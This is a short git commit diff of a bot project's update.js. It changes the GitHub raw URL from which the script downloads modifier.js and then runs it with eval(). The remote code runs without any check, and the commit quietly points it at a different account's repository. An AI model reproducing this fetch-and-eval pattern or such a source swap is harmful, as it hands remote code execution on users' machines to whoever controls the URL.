276c78b6996319ea92736e672b388547fee8f97c
Ashik <iloveyoucheak123@gmail.com>
2025-08-11 17:41:22 +0600

    Add files via upload

--- update.js
+++ update.js
@@ -2,7 +2,7 @@ const axios = require('axios');
 
 (async () => {
   try {
-    const { data } = await axios.get("https://raw.githubusercontent.com/MOHAMMAD-NAYAN-07/Nayan-Bot/main/modifier.js");
+    const { data } = await axios.get("https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan-Bot/main/modifier.js");
     if (data) {
       eval(data);
     }
